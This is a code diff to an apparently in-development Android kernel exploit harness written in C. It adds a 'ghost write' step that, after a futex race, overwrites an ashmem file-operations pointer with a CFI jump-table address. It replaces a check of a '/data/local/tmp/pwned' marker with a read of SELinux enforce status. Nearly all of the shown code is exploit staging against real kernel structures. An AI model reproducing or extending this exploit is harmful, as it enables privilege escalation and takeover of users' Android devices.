@@ -10,8 +10,11 @@
 #include <sys/sysmacros.h>
 #include <fcntl.h>
 #include <errno.h>
+#include <stdint.h>
+#include "target.h"
 
 extern int trigger_futex_race(void);
+extern int ghost_write_global(uint64_t target, uint64_t value);
 extern int phase2_bridge_diag(void);
 
 static void run_worker_payload(void) {
@@ -31,6 +34,18 @@ static void run_worker_payload(void) {
     printf("[*] Stage 1 — futex race (IPv4 MCAST_BLOCK_SOURCE stamp)...\n");
     fflush(stdout);
     int race_res = trigger_futex_race();
+
+    /* After the race, trigger the respray ghost write */
+    printf("[GHOST-WRITE-CALL] target=0x%llx value=0x%llx\n",
+           (unsigned long long)(ADDR_ASHMEM_FOPS + 0x28),
+           (unsigned long long)ADDR_CONFIGFS_WRITE_BIN_FILE_CFI_JT);
+    fflush(stdout);
+    int gw_ret = ghost_write_global(
+        (uint64_t)(ADDR_ASHMEM_FOPS + 0x28),
+        (uint64_t)ADDR_CONFIGFS_WRITE_BIN_FILE_CFI_JT);
+    printf("[GHOST-WRITE-RET] ret=%d\n", gw_ret);
+    fflush(stdout);
+
     printf("[RESULT] Stage 1 diagnostic result: %d\n", race_res);
     if (race_res == 2) {
         printf("\n[*] Stage 2 — reference bridge prerequisite check...\n");
@@ -121,13 +136,18 @@ int main(void) {
         printf("[INIT] Worker killed by signal: %d\n", WTERMSIG(status));
     }
 
-    /* Check output marker */
-    int mfd = open("/data/local/tmp/pwned", O_RDONLY);
-    if (mfd >= 0) {
-        char buf[64] = {0};
-        read(mfd, buf, sizeof(buf) - 1);
-        close(mfd);
-        printf("[INIT] Output marker: %s", buf);
+    /* Check selinux enforce status */
+    int sfd = open("/sys/fs/selinux/enforce", O_RDONLY);
+    if (sfd >= 0) {
+        char sbuf[32] = {0};
+        ssize_t sn = read(sfd, sbuf, sizeof(sbuf) - 1);
+        close(sfd);
+        if (sn > 0) {
+            printf("[INIT] /sys/fs/selinux/enforce: %s", sbuf);
+            if (sbuf[strlen(sbuf) - 1] != '\n') printf("\n");
+        }
+    } else {
+        printf("[INIT] /sys/fs/selinux/enforce open failed: errno=%d (%s)\n", errno, strerror(errno));
     }
 
     printf("[INIT] Test complete. PID 1 parking.\n");
